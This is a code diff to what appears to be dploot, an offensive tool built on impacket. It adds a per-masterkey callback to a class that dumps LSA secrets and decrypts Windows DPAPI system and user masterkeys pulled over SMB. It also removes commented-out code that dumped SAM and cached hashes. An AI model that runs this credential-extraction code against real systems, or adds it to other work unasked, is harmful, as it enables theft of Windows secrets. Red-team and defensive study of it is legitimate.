@@ -2,10 +2,10 @@ from binascii import hexlify, unhexlify
 import logging
 import ntpath
 import os
-from typing import Dict, List
+from typing import Any, Dict, List
 from Cryptodome.Hash import SHA1
 
-from impacket.examples.secretsdump import LSASecrets, SAMHashes
+from impacket.examples.secretsdump import LSASecrets
 
 from dploot.lib.dpapi import decrypt_masterkey
 from dploot.lib.target import Target
@@ -42,7 +42,7 @@ class MasterkeysTriage:
     system_masterkeys_generic_path = 'Windows\\System32\\Microsoft\\Protect'
     share = 'C$'
 
-    def __init__(self, target: Target, conn: DPLootSMBConnection, pvkbytes: bytes = None, passwords: Dict[str,str] = None, nthashes: Dict[str,str] = None, dpapiSystem: Dict[str,str] = None) -> None:
+    def __init__(self, target: Target, conn: DPLootSMBConnection, pvkbytes: bytes = None, passwords: Dict[str,str] = None, nthashes: Dict[str,str] = None, dpapiSystem: Dict[str,str] = None, per_masterkey_callback: Any = None) -> None:
         self.target = target
         self.conn = conn
         self.pvkbytes = pvkbytes
@@ -55,6 +55,8 @@ class MasterkeysTriage:
         if self.dpapiSystem is None:
             self.dpapiSystem = {}
         # should be {"MachineKey":"key","Userkey":"key"}
+
+        self.per_masterkey_callback = per_masterkey_callback
 
     def triage_system_masterkeys(self) -> List[Masterkey]:
         masterkeys = list()
@@ -76,27 +78,9 @@ class MasterkeysTriage:
                                     perSecretCallback=self.getDPAPI_SYSTEM)
                     LSA.dumpSecrets()
                     LSA.finish()
-                    # dump secrets
-                    # LSA = LSASecrets(SECURITYFileName, self.conn.bootkey, self.conn.remote_ops, isRemote=(not bool(self.conn.local_session)))
-                    # print("LSA Cached Hashes:")
-                    # LSA.dumpCachedHashes()
-                    # print("LSA Secrets:")
-                    # LSA.dumpSecrets()
-                    # LSA.finish()
                 except Exception as e:
                     logging.error('LSA hashes extraction failed: %s' % str(e))
 
-                # dump SAM
-                # try:
-                #     SAMFileName = \
-                #         os.path.join(self.target.local_root, r'Windows/System32/config/SAM') if self.conn.local_session \
-                #         else self.conn.remote_ops.saveSAM()
-                #     SAM = SAMHashes(SAMFileName, self.conn.bootkey, isRemote = (not bool(self.conn.local_session)))
-                #     print("SAM Secrets:")
-                #     SAM.dump()
-                #     SAM.finish()
-                # except Exception as e:
-                #     logging.error('SAM hashes extraction failed: %s' % str(e))
 
         system_protect_dir = self.conn.remote_list_dir(self.share, path=self.system_masterkeys_generic_path)
         for d in system_protect_dir:
@@ -115,7 +99,10 @@ class MasterkeysTriage:
                             self.looted_files[guid] = masterkey_bytes
                             key = decrypt_masterkey(masterkey=masterkey_bytes, dpapi_systemkey=self.dpapiSystem)
                             if key is not None:
-                                masterkeys.append(Masterkey(guid=guid, sha1=hexlify(SHA1.new(key).digest()).decode('latin-1'), user='SYSTEM'))
+                                masterkey = Masterkey(guid=guid, sha1=hexlify(SHA1.new(key).digest()).decode('latin-1'), user='SYSTEM')
+                                masterkeys.append(masterkey)
+                                if self.per_masterkey_callback is not None:
+                                    self.per_masterkey_callback(masterkey)
                     elif f.is_directory()>0 and f.get_longname() == 'User':
                         system_protect_dir_user_path = ntpath.join(system_protect_dir_sid_path,'User')
                         system_user_dir = self.conn.remote_list_dir(self.share, path=system_protect_dir_user_path)
@@ -130,7 +117,10 @@ class MasterkeysTriage:
                                     self.looted_files[guid] = masterkey_bytes
                                     key = decrypt_masterkey(masterkey=masterkey_bytes, dpapi_systemkey=self.dpapiSystem, sid=sid)
                                     if key is not None:
-                                        masterkeys.append(Masterkey(guid=guid, sha1=hexlify(SHA1.new(key).digest()).decode('latin-1'), user='SYSTEM_User'))
+                                        masterkey = Masterkey(guid=guid, sha1=hexlify(SHA1.new(key).digest()).decode('latin-1'), user='SYSTEM_User')
+                                        masterkeys.append(masterkey)
+                                        if self.per_masterkey_callback is not None:
+                                            self.per_masterkey_callback(masterkey)
         return masterkeys
 
     def triage_masterkeys(self) -> List[Masterkey]:
@@ -183,7 +173,10 @@ class MasterkeysTriage:
                                 nthash=nthash,
                                 )
                             if key is not None:
-                                masterkeys.append(Masterkey(guid=guid, sha1=hexlify(SHA1.new(key).digest()).decode('latin-1'), user=user))
+                                masterkey = Masterkey(guid=guid, sha1=hexlify(SHA1.new(key).digest()).decode('latin-1'), user=user)
+                                masterkeys.append(masterkey)
+                                if self.per_masterkey_callback is not None:
+                                    self.per_masterkey_callback(masterkey)
         return masterkeys
 
     def getDPAPI_SYSTEM(self,_, secret) -> None:
